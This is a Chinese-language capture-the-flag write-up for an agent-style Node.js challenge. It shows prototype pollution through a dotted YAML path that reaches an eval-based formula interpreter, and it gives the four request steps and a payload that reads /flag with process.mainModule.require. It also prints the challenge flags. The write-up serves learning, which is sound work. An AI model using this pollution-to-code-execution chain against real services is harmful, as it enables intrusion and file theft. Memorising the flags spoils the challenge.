# ∀gent

## 题目简述

题目是 agent 风格 Node.js 服务。用户可控的 `field` 会被拼进 dotted property path，后续经 YAML path 写入逻辑触发原型污染；被污染的策略对象会影响 `policy.evaluate`，最终让公式解释器走到 compat 分支并执行 `eval`，从而读取真实 flag。

## 解题过程

服务源码中核心文件包括 `server.js`、`src/path-builder.js`、`src/config-engine.js`、`src/agent-loop.js`、`src/tool-registry.js` 和 `src/store.js`。访问健康检查接口可以确认服务状态：

```bash
curl http://127.0.0.1:4310/api/health
```

返回：

```json
{"ok":true,"service":"agent-override","version":"0.1.0"}
```

先排除假 flag。`src/store.js` 中的 `refreshFakeFlagConversation()` 会把下面内容作为 fake flag 种子消息写入聊天记录：

```text
ACTF{WuYan_1s_4_b19_Turt13_N07_7h3_F1n41_Fl4g}
```

真实路径在 `/api/projects/:id/agent/override`。该接口接受 POST 请求后调用 `runOverrideJob()`，再进入 `runAgentLoop()`，依次触发 `config.diff`、`config.apply` 和 `policy.evaluate` 等工具。

原型污染入口在 `src/path-builder.js`。后端直接把用户输入拼进 property path：

```javascript
return `agentProfile.scopes.${scope}.environments.${environment}.${section}.${field}`;
```

因此 `field` 不是单纯业务字段，而是 path 注入点。只要传入 `__proto__.policy` 或 `constructor.prototype.<name>` 这类路径片段，后续写入逻辑就会触及对象原型。

触发点在配置 diff/apply 流程。`agent-loop.js` 会调用类似下面的逻辑：

```javascript
applyChanges(filePath, {
  [propertyPath]: value,
})
```

底层 YAML path 写入库在处理包含 `__proto__` 或 `constructor.prototype` 的 dotted path 时，会污染 `Object.prototype`。即使最终文件显示 `changed: false`，原型也已经被改写。

污染后的值会在 `policy.evaluate` 中被读取。策略执行器会根据 profile 决定是否允许 helper、是否强制整数结果，以及是否允许 compat interpreter。需要污染的字段是：

```text
constructor.prototype.selectorProfile = linked
constructor.prototype.resultProfile   = decimal
constructor.prototype.bindingProfile  = compat
constructor.prototype.formula         = <恶意公式>
```

`bindingProfile = "compat"` 会让公式校验失败后仍进入兼容解释器。相关逻辑可以整理为：

```javascript
if (verdict.blockedCount > 0) {
  if (!allowCompatInterpreter) {
    throw new Error("strict numeric formula validation failed");
  }
  return executeFormulaExpression(
    expression,
    context,
    helpers,
    allowHelperCalls,
    requireIntegerResult
  );
}
```

`resultProfile = "decimal"` 让结果不再被整数结果检查卡死。`executeFormulaExpression()` 最终直接执行：

```javascript
const result = eval(`(function(${argNames.join(',')}) { return (${expression}); })`)(...argValues);
```

虽然 `require`、`process`、`global` 等标识符会被校验器标记为 blocked，但 compat 路径不会停止执行。Node.js 模块作用域中 `require` 仍可用，因此公式可以读取 `/flag`。

override 接口默认 20 秒内只允许 1 次请求，因此实际利用需要每步间隔约 21 秒。四步请求的核心参数如下：

```python
steps = [
    ("constructor.prototype.selectorProfile", "linked", "enable helper calls"),
    ("constructor.prototype.resultProfile", "decimal", "disable integer-only formula result checks"),
    ("constructor.prototype.bindingProfile", "compat", "enable compat formula interpreter"),
    (
        "constructor.prototype.formula",
        'pick.constructor("return process.mainModule.require(\\"fs\\").readFileSync(\\"/flag\\",\\"utf8\\").trim()")()',
        "read the flag file",
    ),
]
```

每一步都向同一个 override 接口提交：

```json
{
  "instruction": "<当前步骤说明>",
  "scope": "release",
  "environment": "staging",
  "section": "image",
  "field": "<上面 steps 中的 field>",
  "value": "<上面 steps 中的 value>"
}
```

最后一次 job 的 `result.evaluation.formulaResult` 就是 `/flag` 内容。

最终得到：

```text
ACTF{1n_f4c7_∀_D0esn'7_ref3r_2_und3rwe4r_bu7_an_1nVer7ed_A}
```

最终响应中返回了 `flag` 字段，说明 Agent 工作区覆盖与读取链路生效。

## 方法总结

- 核心技巧：利用 dotted path 写入中的 `constructor.prototype` 原型污染，把策略执行 profile 改成可执行公式，再借 compat 分支落到 `eval`。
- 识别信号：配置 diff、YAML path 写入、用户可控 property path、公式 evaluator 和 compat fallback 同时出现时，应联想到“污染配置对象到代码执行”的链路。
- 复用要点：原型污染不一定表现为文件内容变化，读对象属性时的原型链查找才是关键；override 接口有限速，复现时需要在污染步骤之间等待。
